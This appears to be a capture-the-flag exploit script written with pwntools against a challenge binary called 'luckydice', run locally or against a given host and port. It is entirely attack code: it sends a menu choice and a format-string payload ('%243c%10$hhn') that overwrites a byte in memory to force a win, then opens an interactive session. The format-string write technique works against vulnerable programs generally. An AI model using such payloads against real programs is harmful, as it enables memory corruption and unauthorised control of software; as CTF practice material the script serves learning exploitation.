#!/usr/bin/env python3

from pwn import *

exe = ELF('bin/luckydice')

host = args.HOST or 'localhost'
port = args.PORT or 31849

def local():
  return process(exe.path)

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

r = conn()
r.sendline(b'1')
r.sendline(b'%243c%10$hhn')
r.recvuntil(b'winner')
r.clean()
r.interactive()
